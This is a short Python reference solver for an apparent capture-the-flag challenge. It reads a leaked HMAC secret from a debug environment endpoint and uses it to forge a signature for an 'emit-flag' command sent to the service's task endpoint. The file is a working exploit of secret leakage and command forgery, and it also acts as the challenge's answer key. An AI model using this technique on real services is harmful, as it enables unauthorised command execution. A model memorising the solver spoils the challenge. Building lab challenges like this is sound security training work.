#!/usr/bin/env python3
"""Reference solver for misc-ingestd-envreuse.

The debug endpoint leaks WORKER_HMAC_SECRET; reuse it to sign the emit-flag
command and run it.

    python3 solve.py http://HOST:PORT
"""
import hmac
import json
import sys
import urllib.request
from hashlib import sha256


def _req(url, obj=None, method="GET"):
    data = json.dumps(obj).encode() if obj is not None else None
    headers = {"Content-Type": "application/json"} if data else {}
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    return json.loads(urllib.request.urlopen(req, timeout=10).read())


def solve(base):
    base = base.rstrip("/")
    secret = _req(base + "/debug/env")["env"]["WORKER_HMAC_SECRET"]
    cmd = "emit-flag"
    sig = hmac.new(secret.encode(), cmd.encode(), sha256).hexdigest()
    return _req(base + "/task", {"cmd": cmd, "sig": sig}, "POST")["output"]


if __name__ == "__main__":
    if len(sys.argv) != 2:
        raise SystemExit("usage: solve.py http://HOST:PORT")
    print(solve(sys.argv[1]))
